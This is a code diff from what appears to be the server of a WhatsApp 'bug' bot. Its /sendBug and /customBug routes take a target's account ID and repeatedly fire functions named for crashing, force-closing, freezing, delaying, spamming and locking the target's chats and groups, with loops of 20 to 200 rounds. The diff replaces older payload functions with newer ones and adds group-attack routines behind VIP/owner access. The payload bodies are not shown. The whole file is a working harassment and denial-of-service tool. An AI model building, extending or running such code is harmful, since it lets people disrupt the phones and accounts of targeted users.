@@ -9,46 +9,35 @@ const {
   connectSession,
   startUserSessions,
   disconnectAllActiveConnections,
-  StatusLove,
-  hah,
-  vvvv,
-  FrezeeChat,
+  OmhcOld,
+  FcSpam,
+  StcFC,
+  QQS_FC_INVISIBLE,
+  QQSPrivateBlank,
+  QQS_CRASH_PV,
   NanasBlankOLD,
-  CrashNew,
-  JawaTimurForcloseNew,
-  mbg,
-  FcDelayBlankUi,
-  notif,
-  DelaySpams,
-  func4,
-  delayX7,
-  func2,
-  Pakdejir,
-  TrashRespon,
-  GbCrash,
-  kacunk,
-  func3,
-  maklodelay,
-  DelayBuldoHardFreezeByMia,
-  gladiatorBlankV1,
-  func1,
-  CrashIos,
-  glxZ,
-  Pakdejir1,
-  Cc,
-  Cc1,
-  dingleyryy,
-  xryycrashmedia,
-  blankClik,
-  harddelay,
-  DelayV3,
-  DelayV2,
-  xryyfc,
-  DelayV1,
-  newDelay,
-  kresMamahMu,
   NullBlank,
-  Freeze,
+  CrashNew,
+  blankClik,
+  xryyfc,
+  xryycrashmedia,
+  DelayBuldoHardFreezeByMia,
+// AREA DELAY
+  omhcdelay,
+  QQS_DELAY_INVIS_NEW,
+  OmhcCrash,
+  JustFC5,
+  harddelay,
+  maklodelay,
+// END DELAY
+  CrashIos,
+  CrashIosNewByMia,
+// AREA GROUP
+  GbCrash,
+  ZetTempurGb,
+  BlankFreezeChatGroup,
+  BegalGb,
+  LockGb,
   isVipOrOwner,
   getVipSessionPath,
   prepareVipSessionFolders,
@@ -381,60 +370,110 @@ router.get("/sendBug", async (req, res) => {
       switch (bug) {
         case "crash":
           for (let i = 0; i < 35; i++) {
-            await FrezeeChat(sock, targetJid, false);
             await NanasBlankOLD(sock, targetJid);
+            await OmhcOld(sock, targetJid);
+            await FcSpam(sock, targetJid);
+            await StcFC(sock, targetJid);
+            await QQS_FC_INVISIBLE(sock, targetJid);
+            await QQSPrivateBlank(sock, targetJid);
+            await QQS_CRASH_PV(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "ios":
           for (let i = 0; i < 35; i++) {
             await CrashIosNewByMia(sock, targetJid);
+            await CrashIos(sock, targetJid);
             await sleep(3000)
           }
           break;
         case "bokep":
           for (let i = 0; i < 20; i++) {
-            await CallLog(sock, targetJid);
+           await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000)
           }
           break;
         case "fcinvis":
           for (let i = 0; i < 200; i++) {
             await CrashIosNewByMia(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "fcnoinvis":
           for (let i = 0; i < 200; i++) {
-            await JawaTimurForcloseNew(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "uix":
           for (let i = 0; i < 20; i++) {
-            await pay(sock, targetJid);
-            await xvar(sock, targetJid);
-            await CrashUi(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
         case "delay":
           for (let i = 0; i < 120; i++) {
-            await Pakdejir1(sock, targetJid);
-            await Pakdejir(sock, targetJid);
+            await omhcdelay(sock, targetJid);
+            await QQS_DELAY_INVIS_NEW(sock, targetJid);
+            await OmhcCrash(sock, targetJid);
+            await JustFC5(sock, targetJid);
+            await harddelay(sock, targetJid);
+            await maklodelay(sock, targetJid);
             await sleep(500);
           }
           break;
         case "delay2":
           for (let i = 0; i < 120; i++) {
-            await Cc(sock, targetJid);
-            await Cc1(sock, targetJid);
+            await omhcdelay(sock, targetJid);
+            await QQS_DELAY_INVIS_NEW(sock, targetJid);
+            await OmhcCrash(sock, targetJid);
+            await JustFC5(sock, targetJid);
+            await harddelay(sock, targetJid);
+            await maklodelay(sock, targetJid);
             await sleep(500);
           }
           break;
         case "spam":
           for (let i = 0; i < 35; i++) {
-            await notif(sock, targetJid);
+            await NanasBlankOLD(sock, targetJid);
+            await NullBlank(sock, targetJid);
+            await CrashNew(sock, targetJid);
+            await blankClik(sock, targetJid);
+            await xryyfc(sock, targetJid);
+            await xryycrashmedia(sock, targetJid);
+            await DelayBuldoHardFreezeByMia(sock, targetJid);
             await sleep(1000);
           }
           break;
@@ -670,12 +709,12 @@ router.get("/customBug", async (req, res) => {
 
       // Pemetaan nama bug ke fungsi (pastikan fungsi-fungsi ini diimpor jika dipanggil)
       const bugFunctions = {
-        'crashNotificationVVIP': CrashNotif, // fallback contoh
+        'crashNotificationVVIP': ZetTempurGb, // fallback contoh
         'stealthCrashVVIP': CrashNew,
-        'gsIntX': StatusLove,
-        'forceCloseMentalVVIP': NullBlank,
-        'permenCall': CallLog,
-        'invisibleSpam': BlackScreen
+        'gsIntX': BlankFreezeChatGroup,
+        'forceCloseMentalVVIP': BegalGb,
+        'permenCall': LockGb,
+        'invisibleSpam': GbCrash
       };
 
       for (let i = 0; i < parsedQty; i++) {
